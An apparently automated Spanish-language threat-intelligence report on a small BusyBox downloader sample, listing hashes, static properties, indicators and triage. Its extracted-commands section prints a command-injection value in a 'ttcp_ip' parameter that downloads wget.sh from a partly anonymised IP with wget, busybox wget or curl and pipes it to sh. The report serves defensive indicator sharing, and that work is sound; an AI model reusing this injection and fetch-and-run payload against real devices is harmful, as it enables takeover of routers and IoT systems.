# 🧬 Payload Analysis

`3ab4247dc078bf2d303f3e4bfc50bdeea8f1dc42cc82f37093fc145451a179f9`

## 📌 Resumen

Texto ASCII de 389 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `sh -s lunblkv`
2. `busybox wget hxxp://91.92.40.XXX/wget.sh -O-`
3. `curl hxxp://91.92.40.XXX/wget.sh`
4. `wget hxxp://91.92.40.XXX/wget.sh -O-` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/3ab4247dc078bf2d303f3e4bfc50bdeea8f1dc42cc82f37093fc145451a179f9.md](../../../../../malware-like/oraculo/downloader/3ab4247dc078bf2d303f3e4bfc50bdeea8f1dc42cc82f37093fc145451a179f9.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `3ab4247dc078bf2d303f3e4bfc50bdeea8f1dc42cc82f37093fc145451a179f9`
- **SHA1:** `cac7a64dc982493a0edc61da0646538884d7f946`
- **MD5:** `f8b89f10542ddacce72720311ae8ac24`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 389 B |
| Entropía | 5.3 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
ttcp_num=3&ttcp_size=3&ttcp_ip=-h+%60cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lunblkv%3Bbusybox%
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lunblkv%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lunblkv%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20lunblkv%60 | strings |
| ip | 190.179.139.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| command | ttcp_num=3&ttcp_size=3&ttcp_ip=-h+%60cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lunblkv%3Bbusybox% | strings |
| hash | 3ab4247dc078bf2d303f3e4bfc50bdeea8f1dc42cc82f37093fc145451a179f9 | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
